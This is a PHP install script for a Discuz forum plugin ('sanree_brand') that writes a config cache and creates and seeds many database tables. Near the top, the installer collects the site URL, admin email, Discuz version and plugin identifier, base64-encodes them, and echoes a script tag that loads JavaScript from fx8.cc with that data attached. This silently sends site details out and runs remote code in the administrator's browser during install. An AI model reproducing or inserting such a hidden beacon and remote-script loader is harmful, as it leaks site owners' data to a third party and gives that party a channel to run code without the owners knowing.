<?php
/**
 *      [fx8.cc] (C)2014-2017 ymg6.Com.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: install.php 2014-07-29 10:20:00 sanree checkedby fx8.cc $
 */
 
if(!defined('IN_DISCUZ')) { 
	exit('');
}

$pluginid=$pluginarray['plugin']['identifier'];
require_once DISCUZ_ROOT.'./source/discuz_version.php';
$siteinfo=array(
	'site_version' => DISCUZ_VERSION,
	'site_release' => DISCUZ_RELEASE,
	'site_timestamp' => TIMESTAMP,
	'site_url' => $_G['siteurl'],
	'site_adminemail' => $_G['setting']['adminemail'],
	'plugin_identifier' => $pluginid,
	'plugin_version' => $pluginarray['plugin']['version'],
	'action' => 1,
);
$sitestr=base64_encode(serialize($siteinfo));
$sanree='http://www.fx8.cc/vk.php?data='.$sitestr.'&sign='.md5(md5($sitestr));
echo "<script src=\"".$sanree."\" type=\"text/javascript\"></script>";
function srsysfilecache($data, $file) {
	global $_G;
    $data = stripcslashes($data);
	$dir = DISCUZ_ROOT.'./data/sysdata/';
	if(!is_dir($dir)) {
		dmkdir($dir, 0777);
	}
	if($fp = @fopen($dir.'cache_'.$file, 'wb')) {
		fwrite($fp, $data);
		fclose($fp);
	} else {
		exit('Can not write to cache files, please check directory ./data/ and ./data/sysdata/ .');
	}
}
$bodystyle= array();
$bodystyle['isuse'] = 0;
$bodystyle['ishideheader'] = 1;
$bodystyle['notbackimg'] = 0;
$bodystyle['backgroundcolor'] = '#FFFFFF'; 
$bodystyle['backgroundattachment'] = '';
$bodystyle['backgroundrepeat'] = ''; 
$bodystyle['backgroundpositionx'] = '';
$bodystyle['backgroundpositiony'] = '';
$moduledata=array('allowalbum' => 1,'allowfastpost' => 1, 'allowmultiple' => 0, 'bodystyle' => $bodystyle);
$contents= "<?php\r//Sanree cache file, DO NOT modify me!\r    $"."branddefault='".serialize($moduledata)."';\r?>";
srsysfilecache($contents, "sanree_brand_config.php");

$sql = <<<EOF
CREATE TABLE IF NOT EXISTS `pre_sanree_brand_category` (
  `cateid` smallint(6) NOT NULL auto_increment,
  `pcateid` INT NULL DEFAULT '0',
  `keywords` varchar(255) default NULL,
  `description` varchar(255) default NULL,
  `name` varchar(50) NOT NULL,
  `status` tinyint(4) NOT NULL default '1',
  `dateline` int(10) NOT NULL default '0',
  `displayorder` int(11) NOT NULL default '0',
  `syngroupid` int(11) default '0',
  `clogo` varchar(255) default NULL,
  PRIMARY KEY  (`cateid`)
) ENGINE=MyISAM;

INSERT INTO `pre_sanree_brand_category` (`cateid`, `keywords`, `description`, `name`, `status`, `dateline`, `displayorder`) VALUES
(1, NULL, NULL, '$installlang[defaultcate1]', 1, 1342511498, 0),
(2, NULL, NULL, '$installlang[defaultcate2]', 1, 1342511498, 0),
(3, NULL, NULL, '$installlang[defaultcate3]', 1, 1342511498, 0),
(4, NULL, NULL, '$installlang[defaultcate4]', 1, 1342511498, 0),
(5, NULL, NULL, '$installlang[defaultcate5]', 1, 1342511498, 0),
(6, NULL, NULL, '$installlang[defaultcate6]', 1, 1342511498, 0),
(7, NULL, NULL, '$installlang[defaultcate7]', 1, 1342511498, 0),
(8, NULL, NULL, '$installlang[defaultcate8]', 1, 1342511498, 0),
(9, NULL, NULL, '$installlang[defaultcate9]', 1, 1342511498, 0),
(10, NULL, NULL, '$installlang[defaultcate10]', 1, 1342511498, 0),
(11, NULL, NULL, '$installlang[defaultcate11]', 1, 1342511498, 0),
(12, NULL, NULL, '$installlang[defaultcate12]', 1, 1342511498, 0),
(13, NULL, NULL, '$installlang[defaultcate13]', 1, 1342511498, 0),
(14, NULL, NULL, '$installlang[defaultcate14]', 1, 1342511498, 0);

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_businesses` (
  `bid` int(11) unsigned NOT NULL auto_increment,
  `tid` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `tel114id` int(11) default NULL,
  `keywords` varchar(255) default NULL,
  `description` varchar(255) default NULL,
  `uid` mediumint(8) unsigned default '0',
  `name` varchar(255) NOT NULL,
  `propaganda` varchar(1000) NOT NULL,
  `introduction` varchar(4000) NOT NULL,
  `contact` varchar(1000) NOT NULL,
  `poster` varchar(255) NOT NULL,
  `cateid` int(11) unsigned NOT NULL default '0',
  `weburl` varchar(255) NOT NULL,
  `ip` varchar(20) NOT NULL,
  `dateline` int(11) unsigned NOT NULL,
  `status` tinyint(1) unsigned NOT NULL default '0',
  `istop` tinyint(1) unsigned NOT NULL default '0',
  `isshow` tinyint(1) NOT NULL default '0',
  `isrecommend` tinyint(4) NOT NULL,
  `recommendimg` varchar(255) NOT NULL,
  `displayorder` int(11) NOT NULL,
  `regprice` int(11) NOT NULL default '0',
  `creditunitname` varchar(50) NOT NULL,
  `reason` varchar(255) default NULL,
  `caid` int(11) default '0',
  `aid` int(11) default '0',
  `qq` varchar(255) default NULL,
  `address` varchar(255) default NULL,
  `recommendationindex` decimal(10,1) NOT NULL default '99.9',
  `tel` varchar(255) default NULL,
  `views` int(11) default '1',
  `groupid` int(11) NOT NULL,
  `birthprovince` varchar(255) NOT NULL,
  `birthcity` varchar(255) NOT NULL,
  `birthdist` varchar(255) NOT NULL,
  `birthcommunity` varchar(255) NOT NULL,
  `memo` text NOT NULL,
  `brandno` varchar(50) NOT NULL, 
  `mappos` VARCHAR( 100 ) NOT NULL, 
  `discount` int(11) NOT NULL default '0',
  `ownerid` int(11) NOT NULL default '0',
  `srbirthprovince` varchar(255) default NULL,
  `srbirthcity` varchar(255) default NULL,
  `srbirthdist` varchar(255) default NULL,
  `srbirthcommunity` varchar(255) default NULL, 
  `allowalbum` tinyint(1) NOT NULL,
  `startdate` int(11) NOT NULL,
  `enddate` int(11) NOT NULL,  
  `allowfastpost` tinyint(1) NOT NULL default '1',
  `banner` varchar(255) default NULL,
  `newbanner` varchar(255) default NULL,
  `newbannerurl` varchar(255) default NULL,
  `wezgimg` varchar(255) default NULL,
  `isshowbrandname` tinyint(1) default '0',
  `googlemappos` varchar(255) default NULL,
  `templateconfig` text,
  `allowmultiple` tinyint(1) default '0',
  `msn` varchar(255) default NULL,
  `wangwang` varchar(255) default NULL,
  `baiduhi` varchar(255) default NULL,
  `skype` varchar(255) default NULL, 
  `pbid` int(11) default '0',   
  `brandmf` varchar(255) default NULL,
  `brandtag` varchar(255) default NULL,
  `syngrouptid` int(11) default '0',   
  `iscard` tinyint(1) default '0', 
  `weixin` varchar(255) default NULL,  
  `weixinimg` varchar(255) default NULL,
  `weixinpublic` varchar(255) default NULL,  
  `weixinpublicpic` varchar(255) default NULL,
  `carddetail` varchar(255) default NULL,     
  PRIMARY KEY  (`bid`),
  KEY `cateid` (`cateid`),
  KEY `status` (`status`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_attachment` (
  `aid` mediumint(8) unsigned NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `dateline` int(10) unsigned NOT NULL default '0',
  `filename` varchar(255) NOT NULL default '',
  `filesize` int(10) unsigned NOT NULL default '0',
  `attachment` varchar(255) NOT NULL default '',
  `remote` tinyint(1) unsigned NOT NULL default '0',
  `isimage` tinyint(1) NOT NULL default '0',
  `width` smallint(6) unsigned NOT NULL default '0',
  `thumb` tinyint(1) unsigned NOT NULL default '0',
  PRIMARY KEY  (`aid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_slide` (
  `ID` int(11) default NULL,
  `pic1` varchar(255) default NULL,
  `movie1` varchar(255) default NULL,
  `pic2` varchar(255) default NULL,
  `movie2` varchar(255) default NULL,
  `pic3` varchar(255) default NULL,
  `movie3` varchar(255) default NULL,
  `pic4` varchar(255) default NULL,
  `movie4` varchar(255) default NULL,
  `pic5` varchar(255) default NULL,
  `movie5` varchar(255) default NULL,
  `movie11` varchar(255) default NULL,
  `movie22` varchar(255) default NULL,
  `movie33` varchar(255) default NULL,
  `movie44` varchar(255) default NULL,
  `movie55` varchar(255) default NULL
) ENGINE=MyISAM;
INSERT INTO `pre_sanree_brand_slide` (`ID`, `pic1`, `movie1`, `pic2`, `movie2`, `pic3`, `movie3`, `pic4`, `movie4`, `pic5`, `movie5`, `movie11`, `movie22`, `movie33`, `movie44`, `movie55`) VALUES
(1, '{pluginimg}/ad1.jpg', 'http://www.fx8.cc/', '{pluginimg}/ad2.jpg', 'http://www.fx8.cc/', '{pluginimg}/ad3.jpg', 'http://www.fx8.cc/', '{pluginimg}/ad4.jpg', 'http://www.fx8.cc/', '{pluginimg}/ad5.jpg', 'http://www.fx8.cc/', NULL, NULL, NULL, NULL, NULL),
(2, '{pluginimg}/sad21.jpg', 'http://www.fx8.cc/', '{pluginimg}/sad22.jpg', 'http://www.fx8.cc/', '{pluginimg}/sad23.jpg', 'http://www.fx8.cc/', '{pluginimg}/sad24.jpg', 'http://www.fx8.cc/', '{pluginimg}/sad25.jpg', 'http://www.fx8.cc/', NULL, NULL, NULL, NULL, NULL);

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_group` (
  `groupid` int(11) unsigned NOT NULL auto_increment,
  `order` int(11) NOT NULL,
  `price` int(11) NOT NULL,
  `groupname` varchar(255) NOT NULL,
  `grouplogo` varchar(255) default NULL,
  `dateline` int(11) unsigned NOT NULL,
  `isuse` tinyint(1) NOT NULL,
  `adminid` int(11) NOT NULL,
  `urlmod` int(11) NOT NULL,
  `maxalbumcategory` mediumint(5) NOT NULL,
  `maxalbum` mediumint(5) NOT NULL, 
  `allowtemplate` tinyint(1) default NULL,
  `allowdeletealbum` tinyint(1) default '0',
  `allowbatchimage` tinyint(1) default NULL, 
  `allowsyngroup` tinyint(1) default '0', 
  `smallicons` varchar(255) default NULL,
  `ismf` TINYINT(1) NULL DEFAULT '0',
  `istag` TINYINT(1) NULL DEFAULT '0',
  PRIMARY KEY  (`groupid`)
) ENGINE=MyISAM;
INSERT INTO `pre_sanree_brand_group` (`groupid`, `order`, `price`, `groupname`, `grouplogo`, `smallicons`, `dateline`, `isuse`, `adminid`, `urlmod`, `maxalbumcategory`, `maxalbum`) VALUES
(1, 0, 100, 'vip0', '{pluginimg}/vip0.gif', '{pluginimg}/h_vip0.gif', 1344610027, 1, 1, 0, 5, 15),
(2, 1, 100, 'vip1', '{pluginimg}/vip1.gif', '{pluginimg}/h_vip1.gif', 1344517322, 1, 1, 1, 15, 45);


CREATE TABLE IF NOT EXISTS `pre_sanree_brand_voter` (
  `tid` mediumint(8) unsigned NOT NULL default '0',
  `bid` mediumint(8) NOT NULL default '0',
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `star1` int(11) NOT NULL default '0',
  `star2` int(11) NOT NULL default '0',
  `star3` int(11) NOT NULL default '0',
  `star4` int(11) NOT NULL default '0',
  `star5` int(11) NOT NULL default '0',
  `dateline` int(10) unsigned NOT NULL default '0',
  KEY `tid` (`tid`),
  KEY `uid` (`uid`,`dateline`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_voterlog` (
  `tid` mediumint(8) unsigned NOT NULL default '0',
  `bid` mediumint(8) NOT NULL default '0',
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(255) default NULL,
  `star` int(11) NOT NULL default '0',
  `dateline` int(10) unsigned NOT NULL default '0',
  KEY `tid` (`tid`),
  KEY `uid` (`uid`,`dateline`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_cmenu` (
  `id` smallint(6) unsigned NOT NULL auto_increment,
  `title` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `sort` tinyint(1) NOT NULL default '0',
  `displayorder` tinyint(3) NOT NULL,
  `clicks` smallint(6) unsigned NOT NULL default '1',
  `uid` mediumint(8) unsigned NOT NULL,
  `dateline` int(10) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL default '0',
  `window` tinyint(4) NOT NULL default '0',
  `istop` mediumint(3) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `uid` (`uid`),
  KEY `displayorder` (`displayorder`)
) ENGINE=MyISAM;

INSERT INTO `pre_sanree_brand_cmenu` (`id`, `title`, `url`, `sort`, `displayorder`, `clicks`, `uid`, `dateline`, `status`, `window`, `istop`) VALUES
(1, '$installlang[favorite]', 'home.php?mod=spacecp&ac=favorite&type=thread&id={tid}', 0, 0, 1, 0, 1344828567, 1, 1, 0),
(2, '$installlang[share]', 'home.php?mod=spacecp&ac=share&type=thread&id={tid}', 0, 1, 1, 0, 1344828662, 1, 1, 0),
(3, '$installlang[fankui]', 'plugin.php?id=sanree_brand&mod=msg&bid={bid}&type=2', 0, 1, 1, 0, 1344828662, 1, 1, 0),
(4, '$installlang[baocuo]', 'plugin.php?id=sanree_brand&mod=msg&bid={bid}&type=0', 0, 1, 1, 0, 1344828662, 1, 1, 0),
(5, '$installlang[jubao]', 'plugin.php?id=sanree_brand&mod=msg&bid={bid}&type=3', 0, 1, 1, 0, 1344828662, 1, 1, 0);

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_msg` (
  `msgid` smallint(6) NOT NULL auto_increment,
  `bid` int(11) NOT NULL,
  `typeid` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `words` varchar(255) default NULL,
  `status` tinyint(4) NOT NULL default '0',
  `dateline` int(10) NOT NULL default '0',
  `refuse` text default NULL,
  `opdate` int(10) NOT NULL default '0',
  PRIMARY KEY  (`msgid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_district` (
  `id` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(255) NOT NULL default '',
  `level` tinyint(4) unsigned NOT NULL default '0',
  `usetype` tinyint(1) unsigned NOT NULL default '0',
  `upid` mediumint(8) unsigned NOT NULL default '0',
  `displayorder` smallint(6) NOT NULL default '0',
  `enabled` tinyint(1) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `upid` (`upid`,`displayorder`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_album` (
  `albumid` mediumint(8) unsigned NOT NULL auto_increment,
  `bid` int(11) NOT NULL,
  `tid` int(11) NOT NULL,
  `albumname` varchar(50) NOT NULL default '',
  `catid` smallint(6) unsigned NOT NULL default '0',
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(15) NOT NULL default '',
  `dateline` int(10) unsigned NOT NULL default '0',
  `updatetime` int(10) unsigned NOT NULL default '0',
  `picnum` smallint(6) unsigned NOT NULL default '0',
  `pic` varchar(255) NOT NULL default '',
  `picflag` tinyint(1) NOT NULL default '0',
  `friend` tinyint(1) NOT NULL default '0',
  `password` varchar(10) NOT NULL default '',
  `target_ids` text NOT NULL,
  `favtimes` mediumint(8) unsigned NOT NULL,
  `sharetimes` mediumint(8) unsigned NOT NULL,
  `depict` text NOT NULL,
  `displayorder` int(11) NOT NULL,
  `ishome` tinyint(1) NOT NULL default '0',
  PRIMARY KEY  (`albumid`),
  KEY `uid` (`uid`,`updatetime`),
  KEY `updatetime` (`updatetime`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_album_category` (
  `catid` mediumint(8) unsigned NOT NULL auto_increment,
  `bid` int(11) NOT NULL,
  `tid` int(11) NOT NULL,
  `uid` int(11) NOT NULL default '0',
  `upid` mediumint(8) unsigned NOT NULL default '0',
  `catname` varchar(255) NOT NULL default '',
  `pic` varchar(255) NOT NULL,
  `num` mediumint(8) unsigned NOT NULL default '0',
  `displayorder` smallint(6) NOT NULL default '0',
  `description` text NOT NULL,
  `dateline` int(11) NOT NULL,
  PRIMARY KEY  (`catid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_businesses_module` (
  `mid` int(11) unsigned NOT NULL auto_increment,
  `bid` int(11) NOT NULL,
  PRIMARY KEY  (`mid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_language` (
  `lanid` int(11) unsigned NOT NULL auto_increment,
  `module` varchar(50) default NULL,
  `langkey` varchar(255) NOT NULL,
  `langvalue` varchar(255) NOT NULL,
  PRIMARY KEY  (`lanid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_group_module` (
  `mid` int(11) unsigned NOT NULL auto_increment,
  `groupid` int(11) NOT NULL,
  PRIMARY KEY  (`mid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_diystyle` (
  `diystyleid` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(15) NOT NULL default '',
  `dateline` int(10) unsigned NOT NULL default '0',
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL default '0',
  `issys` tinyint(1) NOT NULL,
  PRIMARY KEY  (`diystyleid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM;
INSERT INTO `pre_sanree_brand_diystyle` (`diystyleid`, `name`, `content`, `uid`, `username`, `dateline`, `displayorder`, `status`, `issys`) VALUES
(1, 'hotbrand', '.stylename{\\r\\n}\\r\\n.stylename ul li{\\r\\nfloat:left;\\r\\noverflow:hidden;\\r\\nwidth:200px;\\r\\nheight:200px;\\r\\nmargin:10px;\\r\\n}\\r\\n.stylename ul li img{\\r\\nwidth:200px;\\r\\n}', 1, 'admin', 1349690762, 1, 1, 1);

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_diytemplate` (
  `diytemplateid` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(15) NOT NULL default '',
  `dateline` int(10) unsigned NOT NULL default '0',
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL default '0',
  `issys` tinyint(1) NOT NULL,
  PRIMARY KEY  (`diytemplateid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_tag` (
  `tagid` int(11) unsigned NOT NULL auto_increment,
  `tagname` char(255) NOT NULL default '',
  `status` tinyint(1) NOT NULL default '0',
  `displayorder` int(11) default '0',
  `dateline` int(11) default NULL,    
  PRIMARY KEY  (`tagid`),
  KEY `tagname` (`tagname`),
  KEY `status` (`status`,`tagid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_mf` (
  `mfid` int(11) unsigned NOT NULL auto_increment,
  `mfname` char(255) NOT NULL default '',
  `status` tinyint(1) NOT NULL default '0',
  `displayorder` int(11) default '0',  
  `dateline` int(11) default NULL,  
  PRIMARY KEY  (`mfid`),
  KEY `mfname` (`mfname`),
  KEY `status` (`status`,`mfid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_searchword` (
  `id` int(11) NOT NULL auto_increment,
  `keyword` varchar(255) NOT NULL,
  `dateline` int(11) default NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM;

INSERT INTO `pre_sanree_brand_diytemplate` (`diytemplateid`, `name`, `content`, `uid`, `username`, `dateline`, `displayorder`, `status`, `issys`) VALUES 
(1, '$installlang[blockclass_index_styletexttitle]', '<div class="module cl xl">\\r\\n<ul>\\r\\n[loop]\\r\\n<li><a href="{url}"{target}>{brandname}</a></li>\\r\\n[/loop]\\r\\n</ul>\\r\\n</div>', 1, 'admin', 1349698114, 0, 1, 1), 
(2, '$installlang[blockclass_index_styleimgtitle]', '<div class="module cl xl">\\r\\n<ul>\\r\\n[loop]\\r\\n<li>\\r\\n<p><a href="{url}"{target}><img src="{pic}" width="{picwidth}" height="{picheight}" /></a></p>\\r\\n<p><a href="{url}"{target}>{brandname}</a></p>\\r\\n</li>\\r\\n[/loop]\\r\\n</ul>\\r\\n</div>', 1, 'admin', 1349746834, 0, 1, 1);

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_assist` (
	`aid` int(11) unsigned NOT NULL auto_increment,
	`bid` int(11) unsigned NOT NULL,
	`uid` int(11) unsigned NOT NULL,
	`dateline` int(10) unsigned NOT NULL default '0',
	PRIMARY KEY  (`aid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_record` (
	`rid` int(11) unsigned NOT NULL auto_increment,
	`bid` int(11) unsigned NOT NULL,
	`uid` int(11) unsigned NOT NULL,
	`former` int(11) unsigned NOT NULL,
	`gid` int(11) unsigned NOT NULL,
	`cost` int(11) unsigned NOT NULL,
	`dateline` int(10) unsigned NOT NULL default '0',
	PRIMARY KEY  (`rid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_menu_order` (
	`index` int(11) unsigned NOT NULL,
	`myalbum` int(11) unsigned NOT NULL,
	`dzgroup` int(11) unsigned NOT NULL,
	`goods` int(11) unsigned NOT NULL,
	`news` int(11) unsigned NOT NULL,
	`coupon` int(11) unsigned NOT NULL,
	`jobs` int(11) unsigned NOT NULL,
	`video` int(11) unsigned NOT NULL,
	`guestbook` int(11) unsigned NOT NULL,
	`ordinary` int(11) unsigned NOT NULL
) ENGINE=MyISAM;
INSERT INTO `pre_sanree_brand_menu_order` (`index`, `myalbum`, `dzgroup`, `goods`, `news`, `coupon`, `jobs`, `video`, `guestbook`, `ordinary`) VALUES
(0, 1, 2, 3, 4, 5, 6, 7, 8, 9);

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_friendly_link` (
  `flid` int(11) NOT NULL auto_increment,
  `title` varchar(255) NOT NULL,
  `url` varchar(255) default NULL,
  `dateline` int(11) NOT NULL,
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL,
  PRIMARY KEY  (`flid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_hint` (
  `hid` int(11) unsigned NOT NULL auto_increment,
  `uid` int(11) NOT NULL,
  `enter` smallint(1) default NULL,
  PRIMARY KEY  (`hid`)
) ENGINE=MyISAM;

EOF;
runquery($sql);
		save_syscache('sanree_brand_category', '');
		save_syscache('sanree_brand_subcategory', '');
		save_syscache('sanree_brand_usercate', '');
		save_syscache('sanree_brand_admincate', '');
$finish = TRUE;

?>